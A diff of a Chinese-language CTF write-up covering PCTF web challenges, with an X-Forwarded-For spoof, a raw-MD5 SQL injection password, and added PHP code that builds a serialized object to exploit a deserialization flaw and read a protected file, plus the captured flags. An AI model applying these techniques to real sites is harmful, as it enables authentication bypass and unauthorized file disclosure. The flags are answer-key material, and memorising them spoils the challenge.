@@ -9,7 +9,6 @@
     - `X-Forwarder-For: 127.0.0.1`
 
 3. Login
-
     - password 129581926211651571912466741651878684928 or 1839431
     - `PCTF{R4w_md5_is_d4ng3rous}`
     - [SQL injection with raw MD5 hashes](http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)
@@ -71,6 +70,40 @@
         ?>
         ```
     - 发现`//flag is in pctf.php`，简直开心，直接访问`view-source:http://web.phrack.top:32779/showimg.php?img=cGN0Zi5waHA=`获取flag，然而`File not found!`。
+    - 返回去研究`index.php`源码，发现还有个名为`class`的参数未用。由源码，`class`应为经过序列化的一个名为`Shield`的类，定义见`shield.php`。
+    - 通过以下代码生成需要传入`class`的值：
+        ```
+        <?php
+        class Shield {
+            public $file;
+            function __construct($filename = 'pctf.php') {
+                $this -> file = $filename;
+            }
+
+            function readfile() {
+                if (!empty($this->file) && stripos($this->file,'..')===FALSE
+                && stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
+                    return @file_get_contents($this->file);
+                }
+            }
+        }
+        $x = new Shield();
+        // $g = "O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}";
+        $g = serialize($x);
+        echo str_replace("\"", "%22", $g);  //强序列化后的内容转换为url中可传入的参数
+        // echo $g;
+        ?>
+        ```
+    - 得到页面源代码：
+        ```
+        <?php
+        	//Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a}
+        	//Fake flag:
+        	echo "FLAG: PCTF{I_4m_not_fl4g}"
+        ?>
+        <img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
+        ```
+    - `PCTF{W3lcome_To_Shi3ld_secret_Ar3a}`
 
 5. IN A Mess
 
